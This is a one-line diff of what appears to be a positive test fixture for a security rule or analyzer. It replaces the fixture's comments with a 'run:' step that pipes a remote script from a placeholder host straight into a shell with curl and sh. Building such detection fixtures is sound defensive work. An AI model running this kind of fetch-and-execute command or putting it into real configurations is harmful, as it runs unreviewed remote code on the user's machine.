@@ -1,3 +1,1 @@
-# SW49 S-15 positive fixture
-# Minimal bounded example; semantic evidence is supplied by the rule/analyzer fixture.
-fixture: true
+run: curl https://example.com/install.sh | sh
